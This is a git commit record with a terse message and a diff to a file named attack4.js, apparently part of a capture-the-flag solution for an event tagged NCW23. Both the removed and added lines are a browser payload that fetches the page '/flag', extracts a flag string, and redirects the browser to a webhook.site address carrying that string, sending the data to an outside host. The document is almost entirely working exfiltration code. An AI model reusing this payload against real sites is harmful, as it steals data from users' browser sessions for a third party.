3e3f4d798c71f725aae394c8fb1b286b44e327fa
Emyr298 <emi.ru298@gmail.com>
2023-12-03 10:02:26 +0700

    s

--- attack4.js
+++ attack4.js
@@ -1,2 +1,5 @@
-const body = (await ((await fetch('/flag'))).text());
-window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${body.match(/NCW23{.+?}/)[0]}`;
+fetch('/flag').then((res) => {
+    res.text().then((test) => {
+        window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${test.match(/NCW23{.+?}/)[0]}`;
+    })
+})
